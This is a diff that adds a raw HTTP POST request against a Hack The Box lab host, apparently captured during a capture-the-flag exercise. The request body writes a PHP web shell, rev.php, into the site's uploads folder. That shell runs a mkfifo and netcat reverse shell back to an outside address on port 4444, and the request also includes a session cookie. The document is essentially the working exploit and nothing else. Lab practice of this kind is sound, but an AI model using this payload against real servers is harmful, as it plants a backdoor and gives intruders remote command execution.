@@ -1,0 +1,18 @@
+POST /edit/index.php HTTP/1.1
+Host: marcomania.microblog.htb
+Content-Length: 107
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://marcomania.microblog.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://marcomania.microblog.htb/edit/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: username=k27dpf0d12l42ss7a35n08rcfv
+Connection: close
+
+id=/var/www/microblog/marcomania/uploads/rev.php&txt=<%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.16.6+4444+>/tmp/f")%3b%3f>
+
+
